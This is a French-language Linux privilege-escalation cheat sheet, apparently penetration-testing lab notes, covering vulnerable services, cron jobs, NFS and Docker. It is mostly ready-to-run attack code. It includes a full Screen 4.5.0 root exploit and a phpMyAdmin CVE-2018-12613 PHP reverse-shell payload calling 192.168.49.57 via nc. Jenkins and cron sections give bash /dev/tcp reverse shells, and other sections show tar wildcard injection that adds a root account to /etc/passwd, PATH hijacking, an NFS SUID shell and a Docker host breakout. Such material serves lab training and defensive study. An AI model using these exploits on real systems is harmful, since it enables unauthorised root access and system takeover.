# 04-Escalade Basée sur les Services et Tâches Planifiées

### Services Applicatifs Vulnérables
> Exploiter des vulnérabilités connues ou des mauvaises configurations dans les services réseau ou locaux.

#### Screen 4.5.0
> Vulnérabilité d'escalade de privilèges locale dans Screen version 4.5.0.
```bash
# Vérifier la version de screen
screen --version

# Si Screen 4.5.0 est installé et SUID root :
# Code d'exploitation (exemple) :
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload"); // Nettoyage
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
#include <unistd.h> // Pour setuid, setgid
#include <stdlib.h> // Pour execvp
int main(void){
    setuid(0);
    setgid(0);
    char *args[] = {"/bin/sh", "-p", NULL}; // Utiliser sh -p pour conserver les privilèges
    execvp("/bin/sh", args);
    return 0; // En cas d'échec d'execvp
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
# Exécution de l'exploit
cd /etc
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # \x0a est un newline
# Attendre un court instant que ld.so.preload soit écrit
screen -ls # Déclenche le chargement de la librairie via SUID screen
/tmp/rootshell
```

#### Jorani v1 (CVE-2023-26469)
> Exploitation d'une vulnérabilité spécifique (RCE) dans l'application Jorani.
```bash
# Exemple (Shiftdel) :
# Utiliser un script d'exploitation pour CVE-2023-26469 pour obtenir RCE.
# La nature exacte du script d'exploitation dépend de la CVE.
# python exploit_jorani_cve-2023-26469.py <target_ip> <command>
# Si le service Jorani tourne en tant que root ou un utilisateur privilégié, cela peut mener à une escalade.
```

#### phpMyAdmin (CVE-2018-12613)
> Inclusion de fichier local (LFI) à RCE dans phpMyAdmin.
Exemple (Shiftdel):
```bash
# Exploiter phpMyAdmin via CVE-2018-12613
# python2 50457.py <target_ip> <port> <phpmyadmin_path> <username> <password> '<payload_php_reverse_shell>'
python2 50457.py 192.168.57.174 8888 /wordpress ThinnerATheWaistline348 '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.57 1234 >/tmp/f"); ?>'
# Le payload est une commande PHP qui crée un reverse shell.
```

#### Jenkins
> Abus de la console de script Jenkins ou création de tâches pour exécuter du code.
Exemple (vmdak):
```bash
# Rediriger le port Jenkins localement via SSH si nécessaire
ssh -L 9999:127.0.0.1:8080 vmdak@192.168.212.103

# Accéder à Jenkins (ex: http://127.0.0.1:9999)
# Option 1: Utiliser la console de script (Manage Jenkins -> Script Console)
# Payload Groovy pour un reverse shell :
# new GroovyShell().evaluate('new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/192.168.49.x/4444 0>&1").start()')

# Option 2: Créer une nouvelle tâche (Freestyle project)
# Dans la section "Build", ajouter une étape "Execute shell" :
bash -c 'bash -i >& /dev/tcp/192.168.49.x/4444 0>&1'
# Sauvegarder et lancer la tâche ("Build Now").
# Si Jenkins s'exécute en tant que root, le shell sera root.
```

#### Services RPC (Remote Procedure Call)
> Exploiter des services RPC vulnérables.
Exemple (PC):
```bash
# Identifier les services RPC (rpcinfo -p <target_ip>)
# Rechercher des exploits pour les services RPC identifiés.
# Exemple avec un exploit Python spécifique (50983.py pour un service RPC non spécifié)
python3 50983.py # Les arguments dépendront de l'exploit.
```

#### Analyse Approfondie des Services et Processus
> Identifier les services tournant en tant que root ou d'autres utilisateurs privilégiés et rechercher des vulnérabilités.

*   **Identification des services et processus :**
    ```bash
    ps aux | grep -E 'root|privileged_user' # Lister les processus
    systemctl list-units --type=service --state=running # Services systemd
    netstat -tulnp # Ports en écoute et services associés
    ss -tulnp # Alternative à netstat
    ```
*   **Analyse des fichiers de configuration des services :** Rechercher des erreurs de configuration, des chemins non sécurisés, ou des options potentiellement exploitables dans les fichiers de configuration (souvent dans `/etc/`).
    ```bash
    # Exemples
    cat /etc/systemd/system/*.service
    cat /etc/init.d/* # Scripts de démarrage SysVinit
    cat /etc/apache2/apache2.conf
    cat /etc/nginx/nginx.conf
    cat /etc/ssh/sshd_config
    cat /etc/mysql/my.cnf
    # Rechercher des directives 'User' ou 'Group' pour voir avec quels privilèges le service tourne.
    # Rechercher des chemins de fichiers de log, de données, ou de scripts qui pourraient être modifiables.
    ```
*   **Logiciels serveur vulnérables :** Identifier les versions des serveurs web, serveurs SSH, bases de données, etc., et rechercher des vulnérabilités connues.
    ```bash
    dpkg -l | grep <nom_service> # Debian/Ubuntu
    rpm -qa | grep <nom_service> # RedHat/CentOS
    # <nom_service> --version (souvent)
    # searchsploit <nom_service> <version>
    ```
*   **Scénario 11 (Exploitation de services vulnérables) :** Si un service tournant en tant que `root` a une vulnérabilité connue (configuration faible, version obsolète), rechercher et tenter d'exploiter cette vulnérabilité localement. Cela peut nécessiter des outils spécifiques ou des exploits trouvés en ligne.

### Abus des Tâches Cron
> Les tâches cron mal configurées sont un vecteur courant d'escalade de privilèges.

**Énumération des Tâches Cron:**
```bash
# Tâches cron système
ls -l /etc/cron.*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.hourly/* # etc.

# Tâches cron utilisateur (nécessite les permissions de lecture)
crontab -l
ls -l /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*
```
**Surveiller l'activité des processus (utile pour identifier les crons qui s'exécutent fréquemment) :**
```bash
# Utiliser pspy (transférer sur la cible)
./pspy64
```

**Types d'Abus de Cron :**

1.  **Permissions d'Écriture sur les Scripts Cron :**
    > Si un script exécuté par une tâche cron (en tant que root) est modifiable par un utilisateur non privilégié.
    Exemple (Flu - tiré de `05-linux-internals...`):
    ```bash
    # Identifier les tâches cron via pspy ou en listant les crons
    # ./pspy64 (surveille les processus, peut révéler des scripts cron)

    # Supposons qu'un script /opt/log-backup.sh est exécuté par root via cron et est modifiable
    ls -l /opt/log-backup.sh # Vérifier les permissions
    # Si modifiable, injecter une commande (ex: reverse shell)
    echo 'bash -i >& /dev/tcp/192.168.49.x/9876 0>&1' >> /opt/log-backup.sh
    # Attendre la prochaine exécution du cron.
    ```
    Exemple (Ochima - tiré de `05-linux-internals...`):
    ```bash
    # Modifier un script de sauvegarde exécuté par cron (/var/backups/etc_Backup.sh)
    ls -l /var/backups/etc_Backup.sh # Vérifier les permissions
    # Si modifiable :
    echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /var/backups/etc_Backup.sh
    # Attendre l'exécution du cron, puis :
    # /tmp/rootbash -p
    # id
    ```

2.  **Abus de Caractères Jokers (Wildcards) dans les Commandes Cron :**
    > Si une commande cron utilise un wildcard (`*`) de manière non sécurisée (ex: `tar *`, `chown *`).
    ```bash
    # Exemple : cron exécute `tar czf /backups/archive.tgz /home/user/*` en tant que root.
    # Dans /home/user/ :
    echo 'echo "hacked::0:0:root:/root:/bin/bash" >> /etc/passwd' > /home/user/rootkit.sh
    chmod +x /home/user/rootkit.sh
    touch "/home/user/--checkpoint-action=exec=sh rootkit.sh"
    touch "/home/user/--checkpoint=1"
    # Lorsque tar s'exécute, il interprète les noms de fichiers comme des options, exécutant rootkit.sh.
    ```

3.  **Variable PATH non Sécurisée dans les Scripts Cron :**
    > Si un script cron exécuté par root utilise des commandes sans leur chemin absolu et que la variable `PATH` du cron peut être influencée ou contient des répertoires inscriptibles (comme `.`).
    ```bash
    # Scénario : /etc/crontab contient : * * * * * root backup.sh
    # Et backup.sh contient : service apache2 restart (sans /usr/sbin/service)
    # Si le PATH du cron inclut un répertoire inscriptible (ex: /tmp) avant /usr/sbin :
    echo '#!/bin/bash' > /tmp/service
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
    chmod +x /tmp/service
    # Attendre l'exécution du cron.
    # /tmp/rootbash -p
    ```

4.  **Permissions d'Écriture sur les Répertoires Cron :**
    > Si `/etc/cron.d`, `/etc/cron.hourly`, etc., sont inscriptibles, on peut y ajouter nos propres scripts cron.
    ```bash
    ls -ld /etc/cron.d
    # Si inscriptible :
    echo '* * * * * root /usr/local/bin/reverse_shell.sh' > /etc/cron.d/myexploit
    # Créer /usr/local/bin/reverse_shell.sh avec le payload.
    ```

### Exploitation de NFS (Network File System)
> Si un partage NFS est configuré avec `no_root_squash`, un client peut créer des fichiers SUID root sur le partage.

**Énumération NFS :**
```bash
showmount -e <target_ip> # Lister les partages NFS
cat /etc/exports # Sur le serveur NFS (si accessible) pour voir les options
```
**Exploitation si `no_root_squash` est activé pour un partage (ex: `/mnt/nfsshare`) :**
```bash
# Sur la machine attaquante (en tant que root local) :
# 1. Monter le partage NFS
mkdir /tmp/nfs_mount
mount -t nfs <target_ip>:/mnt/nfsshare /tmp/nfs_mount

# 2. Créer un payload et le rendre SUID
cat << EOF > /tmp/nfs_mount/suid_shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/nfs_mount/suid_shell.c -o /tmp/nfs_mount/suid_shell
chmod +s /tmp/nfs_mount/suid_shell # Le bit SUID sera effectif sur la cible

# 3. Sur la machine cible (victime) :
# Naviguer vers le partage monté (s'il est monté localement) ou monter le partage.
# Exécuter le binaire SUID :
/mnt/nfsshare/suid_shell # Ou le chemin où le partage est monté sur la cible
# id # Devrait montrer uid=0(root)
```

### Exploitation de Docker
> Si l'utilisateur fait partie du groupe `docker` ou si l'API Docker est exposée sans authentification.

1.  **Appartenance au Groupe `docker` :**
    ```bash
    id # Vérifier si l'utilisateur est dans le groupe 'docker'
    # Si oui, on peut abuser de Docker pour obtenir root sur l'hôte.
    docker run -v /:/host_root -it alpine chroot /host_root /bin/sh
    # Dans le shell Docker : vous êtes root dans un chroot du système de fichiers de l'hôte.
    # Vous pouvez modifier /etc/passwd, ajouter des clés SSH, etc.
    ```

2.  **API Docker Non Authentifiée (Exposée sur le réseau) :**
    ```bash
    # Vérifier si l'API Docker est accessible (par défaut port 2375 ou 2376)
    # nmap -p 2375,2376 <target_ip>
    # curl http://<target_ip>:2375/version # Si accessible

    # Si accessible, utiliser le client Docker pour interagir avec l'API distante :
    export DOCKER_HOST=tcp://<target_ip>:2375
    docker images
    docker run -v /:/host_root -it alpine chroot /host_root /bin/sh
    ``` 